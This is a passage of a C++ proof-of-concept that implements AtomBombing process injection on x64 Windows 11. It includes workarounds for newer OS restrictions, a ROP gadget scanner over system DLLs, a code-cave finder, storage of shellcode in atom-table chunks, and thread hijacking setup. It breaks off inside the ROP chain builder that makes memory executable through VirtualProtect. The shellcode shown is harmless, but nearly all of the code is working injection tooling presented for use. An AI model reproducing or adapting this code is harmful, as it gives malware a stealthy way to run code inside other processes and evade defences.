// AtomBombing.cpp
// AtomBombing Process Injection PoC - x64
// For educational purposes in controlled lab environments only.
//
// Compile with MinGW (MSYS2 UCRT64 / MINGW64):
//   g++ AtomBombing.cpp -o AtomBombing.exe -lntdll -lpsapi -lole32 -luser32 -std=c++17 -O2 -Wall
//
// FIXES APPLIED:
// 1. Adds a hidden window to attach to the GUI subsystem. Required on
//    Windows 11 24H2+, where both GlobalAddAtomW and NtAddAtom are denied
//    for threads with no window station / desktop association.
// 2. Uses NtAddAtom instead of GlobalAddAtomW for the write side.
// 3. Uses NtDeleteAtom instead of GlobalDeleteAtom for cleanup.
// 4. Keeps GlobalGetAtomNameW for the read side (called from the target,
//    which is a GUI process and therefore allowed).
// 5. Prepends a 2-byte "AA" prefix to the shellcode so the first WCHAR is
//    atom-safe (0x4141). The ROP chain jumps to cave_start + 2.
// windows 11
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <vector>
#include <string>
#include <cstring>
#include <algorithm>

// ============================================================
// NT API Definitions
// ============================================================

typedef LONG NTSTATUS;
#ifndef STATUS_SUCCESS
#define STATUS_SUCCESS ((NTSTATUS)0x00000000)
#endif
#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

#ifndef NTAPI
#define NTAPI __stdcall
#endif

typedef USHORT RTL_ATOM;
typedef RTL_ATOM *PRTL_ATOM;

typedef VOID (NTAPI *PPS_APC_ROUTINE)(
    PVOID ApcArgument1,
    PVOID ApcArgument2,
    PVOID ApcArgument3
);

extern "C" {
    NTSTATUS NTAPI NtQueueApcThread(
        HANDLE ThreadHandle,
        PPS_APC_ROUTINE ApcRoutine,
        PVOID ApcArgument1,
        PVOID ApcArgument2,
        PVOID ApcArgument3
    );

    NTSTATUS NTAPI NtSuspendThread(
        HANDLE ThreadHandle,
        PULONG PreviousSuspendCount
    );

    NTSTATUS NTAPI NtResumeThread(
        HANDLE ThreadHandle,
        PULONG PreviousSuspendCount
    );

    NTSTATUS NTAPI NtGetContextThread(
        HANDLE ThreadHandle,
        PCONTEXT ThreadContext
    );

    NTSTATUS NTAPI NtSetContextThread(
        HANDLE ThreadHandle,
        PCONTEXT ThreadContext
    );

    NTSTATUS NTAPI NtAlertResumeThread(
        HANDLE ThreadHandle,
        PULONG PreviousSuspendCount
    );

    // Native atom table API (works on 24H2 where GlobalAddAtomW is blocked)
    NTSTATUS NTAPI NtAddAtom(
        PWSTR     AtomName,
        ULONG     Length,        // bytes, excluding null terminator
        PRTL_ATOM Atom           // output
    );

    NTSTATUS NTAPI NtDeleteAtom(
        RTL_ATOM Atom
    );
}

// ============================================================
// GUI Attachment Workaround (Windows 11 24H2+)
// ============================================================

static LRESULT CALLBACK AtomBombingHiddenWndProc(HWND h, UINT m,
                                                 WPARAM w, LPARAM l) {
    return DefWindowProcW(h, m, w, l);
}

static HWND g_hiddenWnd = NULL;

BOOL AttachToGuiSubsystem() {
    WNDCLASSEXW wc = {0};
    wc.cbSize        = sizeof(wc);
    wc.lpfnWndProc   = AtomBombingHiddenWndProc;
    wc.hInstance     = GetModuleHandleW(NULL);
    wc.lpszClassName = L"AtomBombingHiddenClass";

    ATOM cls = RegisterClassExW(&wc);
    if (cls == 0 && GetLastError() != ERROR_CLASS_ALREADY_EXISTS) {
        printf("[-] RegisterClassExW failed: %lu\n", GetLastError());
        return FALSE;
    }

    g_hiddenWnd = CreateWindowExW(
        0, L"AtomBombingHiddenClass", L"AtomBombing",
        0, 0, 0, 0, 0,
        NULL, NULL, wc.hInstance, NULL
    );

    if (!g_hiddenWnd) {
        printf("[-] CreateWindowExW failed: %lu\n", GetLastError());
        return FALSE;
    }

    printf("[+] Attached to GUI subsystem (HWND = %p)\n",
           (void*)g_hiddenWnd);
    return TRUE;
}

// ============================================================
// Configuration
// ============================================================

constexpr DWORD MAX_ATOM_DATA_SIZE = 255 * sizeof(WCHAR); // 510 bytes per atom

// Shellcode with 2-byte "AA" prefix so the first WCHAR is 0x4141 (atom-safe).
unsigned char g_Shellcode[] = {
    0x41, 0x41,   // 'A' 'A' -> safe atom prefix
    // Real shellcode begins at offset 2
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
    0x48, 0x31, 0xC0,   // xor rax, rax
    0xC3                // ret
};

constexpr SIZE_T SHELLCODE_PREFIX = 2;

// ============================================================
// ROP Gadget Scanner
// ============================================================

struct RopGadgets {
    ULONG_PTR popRcxRet;
    ULONG_PTR popRdxRet;
    ULONG_PTR popR8Ret;
    ULONG_PTR popR9Ret;
    ULONG_PTR popRaxRet;

    ULONG_PTR movR9RcxRet;
    ULONG_PTR movR9RdxRet;
    ULONG_PTR movR9RaxRet;
    ULONG_PTR xchgR9RcxRet;
    ULONG_PTR xchgR9RaxRet;

    ULONG_PTR retGadget;
    ULONG_PTR virtualProtect;

    int extraRcxPops;
    int extraRdxPops;
    int extraR8Pops;
    int extraR9Pops;
    int extraRaxPops;

    BOOL useRcxFallbackForR9;
    BOOL useRdxFallbackForR9;
    BOOL useRaxFallbackForR9;
};

ULONG_PTR FindGadget(HMODULE hModule, const BYTE* pattern, SIZE_T patternLen) {
    if (!hModule || !pattern || patternLen == 0) return 0;

    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) return 0;

    PIMAGE_NT_HEADERS ntHeaders =
        (PIMAGE_NT_HEADERS)((BYTE*)hModule + dosHeader->e_lfanew);
    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) return 0;

    PIMAGE_SECTION_HEADER sections = IMAGE_FIRST_SECTION(ntHeaders);

    for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        if (!(sections[i].Characteristics & IMAGE_SCN_MEM_EXECUTE)) continue;

        BYTE* sectionBase = (BYTE*)hModule + sections[i].VirtualAddress;

        DWORD sectionSize = sections[i].Misc.VirtualSize;
        if (sections[i].SizeOfRawData != 0 &&
            sections[i].SizeOfRawData < sectionSize) {
            sectionSize = sections[i].SizeOfRawData;
        }

        if (sectionSize < patternLen) continue;

        DWORD limit = sectionSize - (DWORD)patternLen;

        for (DWORD j = 0; j <= limit; j++) {
            if (sectionBase[j] != pattern[0]) continue;
            if (memcmp(sectionBase + j, pattern, patternLen) == 0) {
                return (ULONG_PTR)(sectionBase + j);
            }
        }
    }
    return 0;
}

ULONG_PTR FindGadgetMulti(HMODULE* modules, int moduleCount,
                          const BYTE** patterns,
                          const SIZE_T* lengths,
                          const int* extras,
                          int patternCount,
                          int* outExtraPops,
                          HMODULE* outModule)
{
    for (int m = 0; m < moduleCount; m++) {
        if (!modules[m]) continue;
        for (int p = 0; p < patternCount; p++) {
            ULONG_PTR addr = FindGadget(modules[m], patterns[p], lengths[p]);
            if (addr) {
                if (outExtraPops) *outExtraPops = extras[p];
                if (outModule)    *outModule = modules[m];
                return addr;
            }
        }
    }
    return 0;
}

BOOL FindRopGadgets(RopGadgets* gadgets) {
    memset(gadgets, 0, sizeof(RopGadgets));

    HMODULE hNtdll      = GetModuleHandleW(L"ntdll.dll");
    HMODULE hKernelBase = GetModuleHandleW(L"kernelbase.dll");
    HMODULE hKernel32   = GetModuleHandleW(L"kernel32.dll");
    HMODULE hUser32     = GetModuleHandleW(L"user32.dll");

    HMODULE modules[] = { hNtdll, hKernelBase, hKernel32, hUser32 };
    const int moduleCount = 4;

    if (!hNtdll) {
        printf("[-] Failed to get ntdll handle\n");
        return FALSE;
    }

    printf("[*] Searching for ROP gadgets (this may take a few seconds)...\n");
    fflush(stdout);

    HMODULE foundModule = nullptr;

    // ---- pop rcx; ret ----
    {
        printf("    [*] looking for pop rcx; ret...\n"); fflush(stdout);
        const BYTE p0[] = { 0x59, 0xC3 };
        const BYTE p1[] = { 0x59, 0x5A, 0xC3 };
        const BYTE p2[] = { 0x59, 0x5B, 0xC3 };
        const BYTE p3[] = { 0x59, 0x5D, 0xC3 };
        const BYTE p4[] = { 0x59, 0x5E, 0xC3 };
        const BYTE p5[] = { 0x59, 0x5F, 0xC3 };

        const BYTE* pats[]  = { p0, p1, p2, p3, p4, p5 };
        const SIZE_T lens[] = { sizeof(p0), sizeof(p1), sizeof(p2),
                                sizeof(p3), sizeof(p4), sizeof(p5) };
        const int extras[]  = { 0, 1, 1, 1, 1, 1 };

        int extra = 0;
        gadgets->popRcxRet = FindGadgetMulti(modules, moduleCount,
                                             pats, lens, extras, 6,
                                             &extra, &foundModule);
        gadgets->extraRcxPops = extra;
    }

    // ---- pop rdx; ret ----
    {
        printf("    [*] looking for pop rdx; ret...\n"); fflush(stdout);
        const BYTE p0[] = { 0x5A, 0xC3 };
        const BYTE p1[] = { 0x5A, 0x5B, 0xC3 };
        const BYTE p2[] = { 0x5A, 0x59, 0xC3 };
        const BYTE p3[] = { 0x5A, 0x5D, 0xC3 };
        const BYTE p4[] = { 0x5A, 0x5E, 0xC3 };
        const BYTE p5[] = { 0x5A, 0x5F, 0xC3 };

        const BYTE* pats[]  = { p0, p1, p2, p3, p4, p5 };
        const SIZE_T lens[] = { sizeof(p0), sizeof(p1), sizeof(p2),
                                sizeof(p3), sizeof(p4), sizeof(p5) };
        const int extras[]  = { 0, 1, 1, 1, 1, 1 };

        int extra = 0;
        gadgets->popRdxRet = FindGadgetMulti(modules, moduleCount,
                                             pats, lens, extras, 6,
                                             &extra, &foundModule);
        gadgets->extraRdxPops = extra;
    }

    // ---- pop r8; ret ----
    {
        printf("    [*] looking for pop r8; ret...\n"); fflush(stdout);
        const BYTE p0[] = { 0x41, 0x58, 0xC3 };
        const BYTE p1[] = { 0x41, 0x58, 0x41, 0x59, 0xC3 };
        const BYTE p2[] = { 0x41, 0x58, 0x41, 0x5A, 0xC3 };
        const BYTE p3[] = { 0x41, 0x58, 0x41, 0x5B, 0xC3 };
        const BYTE p4[] = { 0x41, 0x58, 0x41, 0x5C, 0xC3 };
        const BYTE p5[] = { 0x41, 0x58, 0x41, 0x5D, 0xC3 };
        const BYTE p6[] = { 0x41, 0x58, 0x41, 0x5E, 0xC3 };
        const BYTE p7[] = { 0x41, 0x58, 0x41, 0x5F, 0xC3 };

        const BYTE* pats[]  = { p0, p1, p2, p3, p4, p5, p6, p7 };
        const SIZE_T lens[] = { sizeof(p0), sizeof(p1), sizeof(p2), sizeof(p3),
                                sizeof(p4), sizeof(p5), sizeof(p6), sizeof(p7) };
        const int extras[]  = { 0, 1, 1, 1, 1, 1, 1, 1 };

        int extra = 0;
        gadgets->popR8Ret = FindGadgetMulti(modules, moduleCount,
                                            pats, lens, extras, 8,
                                            &extra, &foundModule);
        gadgets->extraR8Pops = extra;
    }

    // ---- pop rax; ret ----
    {
        printf("    [*] looking for pop rax; ret...\n"); fflush(stdout);
        const BYTE p0[] = { 0x58, 0xC3 };
        const BYTE p1[] = { 0x58, 0x5B, 0xC3 };
        const BYTE p2[] = { 0x58, 0x59, 0xC3 };
        const BYTE p3[] = { 0x58, 0x5A, 0xC3 };
        const BYTE p4[] = { 0x58, 0x5D, 0xC3 };
        const BYTE p5[] = { 0x58, 0x5E, 0xC3 };
        const BYTE p6[] = { 0x58, 0x5F, 0xC3 };

        const BYTE* pats[]  = { p0, p1, p2, p3, p4, p5, p6 };
        const SIZE_T lens[] = { sizeof(p0), sizeof(p1), sizeof(p2),
                                sizeof(p3), sizeof(p4), sizeof(p5), sizeof(p6) };
        const int extras[]  = { 0, 1, 1, 1, 1, 1, 1 };

        int extra = 0;
        gadgets->popRaxRet = FindGadgetMulti(modules, moduleCount,
                                             pats, lens, extras, 7,
                                             &extra, &foundModule);
        gadgets->extraRaxPops = extra;
    }

    // ---- pop r9; ret (exhaustive) ----
    {
        printf("    [*] looking for pop r9; ret (exhaustive)...\n"); fflush(stdout);
        const BYTE p0[]  = { 0x41, 0x59, 0xC3 };
        const BYTE p1[]  = { 0x41, 0x59, 0x41, 0x50, 0xC3 };
        const BYTE p2[]  = { 0x41, 0x59, 0x41, 0x51, 0xC3 };
        const BYTE p3[]  = { 0x41, 0x59, 0x41, 0x52, 0xC3 };
        const BYTE p4[]  = { 0x41, 0x59, 0x41, 0x53, 0xC3 };
        const BYTE p5[]  = { 0x41, 0x59, 0x41, 0x54, 0xC3 };
        const BYTE p6[]  = { 0x41, 0x59, 0x41, 0x55, 0xC3 };
        const BYTE p7[]  = { 0x41, 0x59, 0x41, 0x56, 0xC3 };
        const BYTE p8[]  = { 0x41, 0x59, 0x41, 0x57, 0xC3 };
        const BYTE p9[]  = { 0x41, 0x59, 0x41, 0x58, 0xC3 };
        const BYTE p10[] = { 0x41, 0x59, 0x41, 0x5A, 0xC3 };
        const BYTE p11[] = { 0x41, 0x59, 0x41, 0x5B, 0xC3 };
        const BYTE p12[] = { 0x41, 0x59, 0x41, 0x5C, 0xC3 };
        const BYTE p13[] = { 0x41, 0x59, 0x41, 0x5D, 0xC3 };
        const BYTE p14[] = { 0x41, 0x59, 0x41, 0x5E, 0xC3 };
        const BYTE p15[] = { 0x41, 0x59, 0x41, 0x5F, 0xC3 };
        const BYTE p16[] = { 0x41, 0x59, 0x50, 0xC3 };
        const BYTE p17[] = { 0x41, 0x59, 0x51, 0xC3 };
        const BYTE p18[] = { 0x41, 0x59, 0x52, 0xC3 };
        const BYTE p19[] = { 0x41, 0x59, 0x53, 0xC3 };
        const BYTE p20[] = { 0x41, 0x59, 0x54, 0xC3 };
        const BYTE p21[] = { 0x41, 0x59, 0x55, 0xC3 };
        const BYTE p22[] = { 0x41, 0x59, 0x56, 0xC3 };
        const BYTE p23[] = { 0x41, 0x59, 0x57, 0xC3 };
        const BYTE p24[] = { 0x41, 0x59, 0x58, 0xC3 };
        const BYTE p25[] = { 0x41, 0x59, 0x5A, 0xC3 };
        const BYTE p26[] = { 0x41, 0x59, 0x5B, 0xC3 };
        const BYTE p27[] = { 0x41, 0x59, 0x5D, 0xC3 };
        const BYTE p28[] = { 0x41, 0x59, 0x5E, 0xC3 };
        const BYTE p29[] = { 0x41, 0x59, 0x5F, 0xC3 };
        const BYTE p30[] = { 0x41, 0x59, 0x41, 0x5A, 0x41, 0x5B, 0xC3 };
        const BYTE p31[] = { 0x41, 0x59, 0x41, 0x5A, 0x41, 0x5C, 0xC3 };
        const BYTE p32[] = { 0x41, 0x59, 0x41, 0x5A, 0x41, 0x5D, 0xC3 };
        const BYTE p33[] = { 0x41, 0x59, 0x41, 0x5B, 0x41, 0x5C, 0xC3 };
        const BYTE p34[] = { 0x41, 0x59, 0x41, 0x5B, 0x41, 0x5D, 0xC3 };

        const BYTE* pats[] = {
            p0, p1, p2, p3, p4, p5, p6, p7, p8, p9,
            p10, p11, p12, p13, p14, p15, p16, p17, p18, p19,
            p20, p21, p22, p23, p24, p25, p26, p27, p28, p29,
            p30, p31, p32, p33, p34
        };
        const SIZE_T lens[] = {
            sizeof(p0), sizeof(p1), sizeof(p2), sizeof(p3), sizeof(p4),
            sizeof(p5), sizeof(p6), sizeof(p7), sizeof(p8), sizeof(p9),
            sizeof(p10), sizeof(p11), sizeof(p12), sizeof(p13), sizeof(p14),
            sizeof(p15), sizeof(p16), sizeof(p17), sizeof(p18), sizeof(p19),
            sizeof(p20), sizeof(p21), sizeof(p22), sizeof(p23), sizeof(p24),
            sizeof(p25), sizeof(p26), sizeof(p27), sizeof(p28), sizeof(p29),
            sizeof(p30), sizeof(p31), sizeof(p32), sizeof(p33), sizeof(p34)
        };
        const int extras[] = {
            0, 1, 1, 1, 1, 1, 1, 1, 1, 1,
            1, 1, 1, 1, 1, 1, 1, 1, 1, 1,
            1, 1, 1, 1, 1, 1, 1, 1, 1, 1,
            2, 2, 2, 2, 2
        };

        int extra = 0;
        gadgets->popR9Ret = FindGadgetMulti(modules, moduleCount,
                                            pats, lens, extras, 35,
                                            &extra, &foundModule);
        gadgets->extraR9Pops = extra;

        if (gadgets->popR9Ret) {
            printf("[*] pop r9 gadget found at 0x%p (extra pops: %d)\n",
                   (void*)gadgets->popR9Ret, extra);
        } else {
            printf("[*] pop r9; ret not found -- trying mov/xchg fallbacks\n");
        }
    }

    // ---- mov r9, rcx; ret ----
    {
        printf("    [*] looking for mov r9, rcx; ret...\n"); fflush(stdout);
        const BYTE p0[] = { 0x49, 0x89, 0xC9, 0xC3 };
        const BYTE* pats[]  = { p0 };
        const SIZE_T lens[] = { sizeof(p0) };
        const int extras[]  = { 0 };
        int extra = 0;
        gadgets->movR9RcxRet = FindGadgetMulti(modules, moduleCount,
                                               pats, lens, extras, 1,
                                               &extra, &foundModule);
        if (gadgets->movR9RcxRet) {
            printf("[*] mov r9, rcx; ret found at 0x%p\n",
                   (void*)gadgets->movR9RcxRet);
        }
    }

    // ---- mov r9, rdx; ret ----
    {
        printf("    [*] looking for mov r9, rdx; ret...\n"); fflush(stdout);
        const BYTE p0[] = { 0x49, 0x89, 0xD1, 0xC3 };
        const BYTE* pats[]  = { p0 };
        const SIZE_T lens[] = { sizeof(p0) };
        const int extras[]  = { 0 };
        int extra = 0;
        gadgets->movR9RdxRet = FindGadgetMulti(modules, moduleCount,
                                               pats, lens, extras, 1,
                                               &extra, &foundModule);
        if (gadgets->movR9RdxRet) {
            printf("[*] mov r9, rdx; ret found at 0x%p\n",
                   (void*)gadgets->movR9RdxRet);
        }
    }

    // ---- mov r9, rax; ret ----
    {
        printf("    [*] looking for mov r9, rax; ret...\n"); fflush(stdout);
        const BYTE p0[] = { 0x49, 0x89, 0xC1, 0xC3 };
        const BYTE* pats[]  = { p0 };
        const SIZE_T lens[] = { sizeof(p0) };
        const int extras[]  = { 0 };
        int extra = 0;
        gadgets->movR9RaxRet = FindGadgetMulti(modules, moduleCount,
                                               pats, lens, extras, 1,
                                               &extra, &foundModule);
        if (gadgets->movR9RaxRet) {
            printf("[*] mov r9, rax; ret found at 0x%p\n",
                   (void*)gadgets->movR9RaxRet);
        }
    }

    // ---- xchg r9, rcx; ret ----
    {
        printf("    [*] looking for xchg r9, rcx; ret...\n"); fflush(stdout);
        const BYTE p0[] = { 0x49, 0x87, 0xC9, 0xC3 };
        const BYTE* pats[]  = { p0 };
        const SIZE_T lens[] = { sizeof(p0) };
        const int extras[]  = { 0 };
        int extra = 0;
        gadgets->xchgR9RcxRet = FindGadgetMulti(modules, moduleCount,
                                                pats, lens, extras, 1,
                                                &extra, &foundModule);
        if (gadgets->xchgR9RcxRet) {
            printf("[*] xchg r9, rcx; ret found at 0x%p\n",
                   (void*)gadgets->xchgR9RcxRet);
        }
    }

    // ---- xchg r9, rax; ret ----
    {
        printf("    [*] looking for xchg r9, rax; ret...\n"); fflush(stdout);
        const BYTE p0[] = { 0x49, 0x93, 0xC3 };
        const BYTE* pats[]  = { p0 };
        const SIZE_T lens[] = { sizeof(p0) };
        const int extras[]  = { 0 };
        int extra = 0;
        gadgets->xchgR9RaxRet = FindGadgetMulti(modules, moduleCount,
                                                pats, lens, extras, 1,
                                                &extra, &foundModule);
        if (gadgets->xchgR9RaxRet) {
            printf("[*] xchg r9, rax; ret found at 0x%p\n",
                   (void*)gadgets->xchgR9RaxRet);
        }
    }

    // ---- ret ----
    {
        printf("    [*] looking for ret...\n"); fflush(stdout);
        const BYTE p0[] = { 0xC3 };
        const BYTE* pats[]  = { p0 };
        const SIZE_T lens[] = { sizeof(p0) };
        const int extras[]  = { 0 };
        int extra = 0;
        gadgets->retGadget = FindGadgetMulti(modules, moduleCount,
                                             pats, lens, extras, 1,
                                             &extra, &foundModule);
    }

    // ---- VirtualProtect ----
    if (hKernel32) {
        gadgets->virtualProtect =
            (ULONG_PTR)GetProcAddress(hKernel32, "VirtualProtect");
    }
    if (!gadgets->virtualProtect && hKernelBase) {
        gadgets->virtualProtect =
            (ULONG_PTR)GetProcAddress(hKernelBase, "VirtualProtect");
    }

    // ---- Fallback decision ----
    if (!gadgets->popR9Ret) {
        if (gadgets->movR9RcxRet && gadgets->popRcxRet) {
            gadgets->useRcxFallbackForR9 = TRUE;
            printf("[*] Using rcx->r9 fallback (mov r9, rcx)\n");
        } else if (gadgets->xchgR9RcxRet && gadgets->popRcxRet) {
            gadgets->useRcxFallbackForR9 = TRUE;
            printf("[*] Using rcx->r9 fallback (xchg r9, rcx)\n");
        } else if (gadgets->movR9RdxRet && gadgets->popRdxRet) {
            gadgets->useRdxFallbackForR9 = TRUE;
            printf("[*] Using rdx->r9 fallback (mov r9, rdx)\n");
        } else if (gadgets->movR9RaxRet && gadgets->popRaxRet) {
            gadgets->useRaxFallbackForR9 = TRUE;
            printf("[*] Using rax->r9 fallback (mov r9, rax)\n");
        } else if (gadgets->xchgR9RaxRet && gadgets->popRaxRet) {
            gadgets->useRaxFallbackForR9 = TRUE;
            printf("[*] Using rax->r9 fallback (xchg r9, rax)\n");
        }
    }

    // ---- Print ----
    printf("[*] ROP Gadgets found:\n");
    printf("    pop rcx; ret     = 0x%p (extra: %d)\n",
           (void*)gadgets->popRcxRet, gadgets->extraRcxPops);
    printf("    pop rdx; ret     = 0x%p (extra: %d)\n",
           (void*)gadgets->popRdxRet, gadgets->extraRdxPops);
    printf("    pop r8; ret      = 0x%p (extra: %d)\n",
           (void*)gadgets->popR8Ret, gadgets->extraR8Pops);
    printf("    pop r9; ret      = 0x%p (extra: %d)\n",
           (void*)gadgets->popR9Ret, gadgets->extraR9Pops);
    printf("    pop rax; ret     = 0x%p (extra: %d)\n",
           (void*)gadgets->popRaxRet, gadgets->extraRaxPops);
    printf("    mov r9, rcx; ret = 0x%p\n", (void*)gadgets->movR9RcxRet);
    printf("    mov r9, rdx; ret = 0x%p\n", (void*)gadgets->movR9RdxRet);
    printf("    mov r9, rax; ret = 0x%p\n", (void*)gadgets->movR9RaxRet);
    printf("    xchg r9, rcx;ret = 0x%p\n", (void*)gadgets->xchgR9RcxRet);
    printf("    xchg r9, rax;ret = 0x%p\n", (void*)gadgets->xchgR9RaxRet);
    printf("    ret              = 0x%p\n", (void*)gadgets->retGadget);
    printf("    VirtualProtect   = 0x%p\n", (void*)gadgets->virtualProtect);
    printf("    fallback: rcx=%d rdx=%d rax=%d\n",
           gadgets->useRcxFallbackForR9,
           gadgets->useRdxFallbackForR9,
           gadgets->useRaxFallbackForR9);

    // ---- Validate ----
    BOOL ok = TRUE;
    if (!gadgets->popRcxRet) { printf("[-] Missing pop rcx\n"); ok = FALSE; }
    if (!gadgets->popRdxRet) { printf("[-] Missing pop rdx\n"); ok = FALSE; }
    if (!gadgets->popR8Ret)  { printf("[-] Missing pop r8\n");  ok = FALSE; }

    if (!gadgets->popR9Ret &&
        !gadgets->useRcxFallbackForR9 &&
        !gadgets->useRdxFallbackForR9 &&
        !gadgets->useRaxFallbackForR9) {
        printf("[-] Missing pop r9 and no fallback available\n");
        ok = FALSE;
    }

    if (!gadgets->retGadget)      { printf("[-] Missing ret\n");            ok = FALSE; }
    if (!gadgets->virtualProtect) { printf("[-] Missing VirtualProtect\n"); ok = FALSE; }

    if (!ok) {
        printf("[-] Failed to find all required gadgets\n");
        return FALSE;
    }

    printf("[+] All required gadgets found\n");
    return TRUE;
}

// ============================================================
// Code Cave Finder
// ============================================================

struct CodeCave {
    ULONG_PTR address;
    SIZE_T    size;
};

BOOL FindCodeCave(ULONG_PTR moduleBase, CodeCave* cave, SIZE_T requiredSize) {
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)moduleBase;
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) return FALSE;

    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(moduleBase + dosHeader->e_lfanew);
    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) return FALSE;

    PIMAGE_SECTION_HEADER sections = IMAGE_FIRST_SECTION(ntHeaders);

    for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        if ((sections[i].Characteristics & IMAGE_SCN_MEM_WRITE) &&
            !(sections[i].Characteristics & IMAGE_SCN_MEM_EXECUTE)) {

            ULONG_PTR sectionBase = moduleBase + sections[i].VirtualAddress;
            DWORD sectionSize = sections[i].Misc.VirtualSize;

            if (sectionSize < requiredSize) continue;

            BYTE* ptr = (BYTE*)sectionBase;
            DWORD remaining = sectionSize;
            DWORD need = (DWORD)requiredSize;

            while (remaining >= need) {
                BOOL allZero = TRUE;
                for (DWORD j = 0; j < need; j++) {
                    if (ptr[j] != 0) { allZero = FALSE; break; }
                }
                if (allZero) {
                    cave->address = (ULONG_PTR)ptr;
                    cave->size = need;
                    printf("[+] Found code cave at 0x%p (size: %zu) in section %.8s\n",
                           (void*)cave->address, cave->size, sections[i].Name);
                    return TRUE;
                }
                ptr++;
                remaining--;
            }
        }
    }

    printf("[-] No suitable code cave found\n");
    return FALSE;
}

// ============================================================
// Atom Table Operations (using NtAddAtom / NtDeleteAtom)
// ============================================================

struct AtomChunk {
    ATOM   atom;
    DWORD  dataSize;
    DWORD  offset;
};

std::vector<AtomChunk> StoreDataInAtoms(const BYTE* data, SIZE_T dataSize) {
    std::vector<AtomChunk> atoms;
    DWORD offset = 0;

    printf("[*] Storing %zu bytes in atom table (via NtAddAtom)...\n", dataSize);

    while (offset < dataSize) {
        DWORD chunkSize = (DWORD)std::min((SIZE_T)(MAX_ATOM_DATA_SIZE), dataSize - offset);

        if (chunkSize % sizeof(WCHAR) != 0) {
            chunkSize += sizeof(WCHAR) - (chunkSize % sizeof(WCHAR));
        }

        DWORD wcharCount = chunkSize / sizeof(WCHAR);
        std::vector<WCHAR> atomStr(wcharCount + 1, 0);
        memcpy(atomStr.data(), data + offset,
               std::min((SIZE_T)chunkSize, dataSize - offset));

        BOOL hasContent = FALSE;
        for (DWORD i = 0; i < wcharCount; i++) {
            if (atomStr[i] != 0) { hasContent = TRUE; break; }
        }
        if (!hasContent) atomStr[0] = 0x0001;

        RTL_ATOM atom = 0;
        NTSTATUS status = NtAddAtom(atomStr.data(), chunkSize, &atom);

        if (!NT_SUCCESS(status) || atom == 0) {
            printf("[-] NtAddAtom failed for chunk at offset %u: 0x%08lX\n",
                   offset, (unsigned long)status);
            printf("    First WCHAR = 0x%04X, Length = %u bytes\n",
                   (unsigned)atomStr[0], chunkSize);
            return {};
        }

        AtomChunk chunk;
        chunk.atom     = (ATOM)atom;
        chunk.dataSize = chunkSize;
        chunk.offset   = offset;
        atoms.push_back(chunk);

        printf("    Chunk %zu: atom=0x%04X, offset=%u, size=%u\n",
               atoms.size() - 1, (unsigned)atom, offset, chunkSize);

        offset += chunkSize;
    }

    printf("[+] Stored %zu chunks in atom table\n", atoms.size());
    return atoms;
}

void CleanupAtoms(const std::vector<AtomChunk>& atoms) {
    for (const auto& chunk : atoms) {
        NtDeleteAtom((RTL_ATOM)chunk.atom);
    }
}

// ============================================================
// Thread Enumeration
// ============================================================

struct TargetThread {
    DWORD  threadId;
    HANDLE hThread;
};

std::vector<TargetThread> EnumerateTargetThreads(DWORD targetPid) {
    std::vector<TargetThread> threads;

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        printf("[-] CreateToolhelp32Snapshot failed: %lu\n", GetLastError());
        return threads;
    }

    THREADENTRY32 te;
    te.dwSize = sizeof(te);

    if (Thread32First(hSnapshot, &te)) {
        do {
            if (te.th32OwnerProcessID == targetPid) {
                HANDLE hThread = OpenThread(
                    THREAD_SET_CONTEXT | THREAD_GET_CONTEXT |
                    THREAD_SUSPEND_RESUME | THREAD_QUERY_INFORMATION,
                    FALSE,
                    te.th32ThreadID
                );

                if (hThread) {
                    TargetThread tt;
                    tt.threadId = te.th32ThreadID;
                    tt.hThread = hThread;
                    threads.push_back(tt);
                    printf("[+] Found target thread: TID %lu\n", te.th32ThreadID);
                }
            }
        } while (Thread32Next(hSnapshot, &te));
    }

    CloseHandle(hSnapshot);
    return threads;
}

// ============================================================
// ROP Chain Builder
// ============================================================

std::vector<BYTE> BuildRopChain(
    const RopGadgets& gadgets,
    ULONG_PTR virtualProtectAddr,
    SIZE_T    virtualProtectSize,
    ULONG_PTR shellcodeEntry,
    ULONG_PTR oldProtectAddr)
{
    std::vector<BYTE> ropChain;
    auto pushQword = [&ropChain](ULONG_PTR value) {
        for (int i = 0; i < 8; i++) ropChain.push_back((BYTE)(value >> (i * 8)));
    };
    auto emitPop = [&](ULONG_PTR g, ULONG_PTR v, int extra) {
        pushQword(g); pushQword(v);
        for (int i = 0; i < extra; i++) pushQword(0);
    };

    // pop rcx; ret -> lpAddress (region start)
    emitPop(gadgets.popRcxRet, virtualProtectAddr, gadgets.extraRcxPops);

    // pop rdx; ret -> dwSize (full region size)
    emitPop(gadgets.popRdxRet, virtualProtectSize, gadgets.extraRdxPops);

    // pop r8; ret -> PAGE_EXECUTE_READWRITE (0x40)
    emitPop(gadgets.popR8Ret, 0x40, gadgets.extraR8Pops);

    // r9 -> oldProtectAddr
    if (gadgets.popR9Ret) {
        emitPop(gadgets.popR9Ret, oldProtectAddr, gadgets.extraR9Pops);
    } else if (gadgets.useRcxFallbackForR9) {
        emitPop(gadgets.popRcxRet, oldProtectAddr, gadgets.extraRcxPops);
        if (gadgets.movR9RcxRet)       pushQword(gadgets.movR9RcxRet);
        else if (gadgets.xchgR9RcxRet) pushQword(gadgets.xchgR9RcxRet);
    } else if (gadgets.useRdxFallbackForR9) {
        emitPop(gadgets.popRdxRet, oldProtectAddr, gadgets.extraRdxPops);
        if (gadgets.movR9RdxRet) pushQword(gadgets.movR9RdxRet);
    } else if (gadgets.useRaxFallbackForR9) {
        emitPop(gadgets.popRaxRet, oldProtectAddr, gadgets.extraRaxPops);
